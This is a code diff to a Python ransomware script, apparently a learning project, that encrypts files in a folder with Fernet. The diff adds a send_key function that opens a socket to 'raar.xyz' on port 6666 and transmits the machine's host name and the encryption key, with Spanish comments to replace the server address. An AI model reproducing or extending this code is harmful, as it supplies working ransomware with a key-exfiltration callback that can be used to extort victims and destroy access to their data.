@@ -5,6 +5,8 @@ import logging
 import os
 import sys
 from cryptography.fernet import Fernet
+import socket
+import datetime
 
 
 class Ransomware:
@@ -139,6 +141,19 @@ class Ransomware:
 
         return num_decrypted_files
 
+def send_key(hostname, key):
+
+    flag = False
+    #Conectarse a servidor de ransomware para enviar nombre del host y llave
+    ip_address = 'raar.xyz' #CAMBIAR POR DIRECCIÓN DEL SERVIDOR AL QUE SE ENVIA
+    port = 6666
+    ttime = datetime.datetime.now()
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((ip_address, port))
+        s.send(f'[{ttime}] - {hostname}: {key}'.encode('utf-8'))
+    flag = True
+
+    return flag
 
 if __name__ == '__main__':
     logging.basicConfig(level=logging.DEBUG)
@@ -154,11 +169,15 @@ if __name__ == '__main__':
     with open("thekey.key","wb") as thekey: #Key file in just to be sure we have the key, in real case scenarios this won't exist
             thekey.write(key)
 
-    # Encrypt files located in the same folder as our ransomware.
-    # path = os.path.dirname(os.path.abspath(__file__))
-    path = 'Test'
+    path = 'Cifrado'
 
+    # Encrypt files located in the given directory
     number_encrypted_files = ransomware.encrypt_files_in_folder(key, path)
     print('Number of encrypted files: {}'.format(number_encrypted_files))
 
-    ransomware.decrypt_files_in_folder(path)
+    # Decrypt files located in the given directory
+    number_decrypted_files = ransomware.decrypt_files_in_folder(path)
+    print('Number of decrypted files: {}'.format(number_decrypted_files))
+
+    hostname = socket.gethostname()
+    send_key(hostname, key)
